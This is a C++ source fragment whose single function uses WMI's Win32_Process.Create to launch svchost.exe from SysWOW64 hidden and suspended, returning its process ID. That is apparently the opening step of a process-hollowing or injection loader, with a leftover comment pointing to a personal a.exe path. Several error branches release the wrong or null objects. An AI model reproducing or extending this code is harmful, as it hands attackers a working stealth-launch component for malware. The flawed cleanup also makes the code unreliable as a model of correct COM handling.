#include "initialize_wmi.h"




DWORD CreateProcess_API()
{
	IWbemClassObject* oWin32Process = NULL;
	HRESULT hr;
	hr = pSvc->GetObject((BSTR)(StringToWString("Win32_Process")).c_str(), 0, NULL, &oWin32Process, NULL);
	if (FAILED(hr)) {
		pSvc->Release();
		
		return 0;
	}

	// Win32_ProcessStartup
	IWbemClassObject* oWin32ProcessStartup = NULL;
	hr = pSvc->GetObject((BSTR)(StringToWString("Win32_ProcessStartup")).c_str(), 0, NULL, &oWin32ProcessStartup, NULL);
	if (FAILED(hr)) {
		oWin32ProcessStartup->Release();
		
		return 0;
	}
	

	// Create
	IWbemClassObject* pInParamsDefinition = NULL;
	hr = oWin32Process->GetMethod((BSTR)(StringToWString("Create")).c_str(), 0, &pInParamsDefinition, NULL);
	if (FAILED(hr)) {
		oWin32Process->Release();
		
		return 0;
	}

	IWbemClassObject* pStartupInstance = NULL;
	hr = oWin32ProcessStartup->SpawnInstance(0, &pStartupInstance);
	if (FAILED(hr)) {
		oWin32ProcessStartup->Release();
		
		return 0;
	}
	

	IWbemClassObject* pParamsInstance = NULL;
	hr = pInParamsDefinition->SpawnInstance(0, &pParamsInstance);
	if (FAILED(hr)) {
		pInParamsDefinition->Release();
		
		return 0;
	}

	WCHAR wcCommandExecute[MAX_PATH + 1];

	wcscpy_s(wcCommandExecute, (StringToWString("C:\\Windows\\SysWOW64\\svchost.exe")).c_str());//bunu sonra düzelt C:\\Users\\ereborlugimli\\Desktop\\LS\\main\\a.exe

	VARIANT varCommand;
	VariantInit(&varCommand);
	varCommand.vt = VT_BSTR;
	varCommand.bstrVal = wcCommandExecute;
	hr = pParamsInstance->Put((BSTR)(StringToWString("CommandLine")).c_str(), 0, &varCommand, 0);
	if (FAILED(hr)) {
		pParamsInstance->Release();
		
		return 0;
	}

	CComVariant varCommand_ShowWindow;
	varCommand_ShowWindow = SW_HIDE;
	hr = pStartupInstance->Put((BSTR)(StringToWString("ShowWindow")).c_str(), 0, &varCommand_ShowWindow, 0);
	if (FAILED(hr)) {
		pParamsInstance->Release();
		
		return 0;
	}
	
	CComVariant varCreateFlags(CREATE_SUSPENDED);
	hr = pStartupInstance->Put(CComBSTR((StringToWString("CreateFlags")).c_str()), 0, &varCreateFlags, 0);
	if (FAILED(hr)) {
		pParamsInstance->Release();
		
		return 0;
	}


	VARIANT vtDispatch;
	VariantInit(&vtDispatch);
	vtDispatch.vt = VT_DISPATCH;
	vtDispatch.byref = pStartupInstance;
	hr = pParamsInstance->Put((BSTR)(StringToWString("ProcessStartupInformation")).c_str(), 0, &vtDispatch, 0);
	if (FAILED(hr)) {
		pParamsInstance->Release();
		
		return 0;
	}

	IWbemClassObject* pOutParams = NULL;
	hr = pSvc->ExecMethod((BSTR)(StringToWString("Win32_Process")).c_str(), (BSTR)(StringToWString("Create")).c_str(), 0, NULL, pParamsInstance, &pOutParams, NULL);
	if (FAILED(hr)) {
		pSvc->Release();
		
		return 0;
	}

	VARIANT pid;
	CIMTYPE pid_type(CIM_UINT32);

	// collect PID
	if (FAILED(pOutParams->Get(CComBSTR((StringToWString("ProcessId")).c_str()), 0, &pid, &pid_type, NULL)))
	{
		return 0x0;
	}

	DWORD ppid = (DWORD)V_I4(&pid);
	 

	pParamsInstance->Release();
	oWin32Process->Release();
	oWin32ProcessStartup->Release();
	pStartupInstance->Release();

	return ppid;
}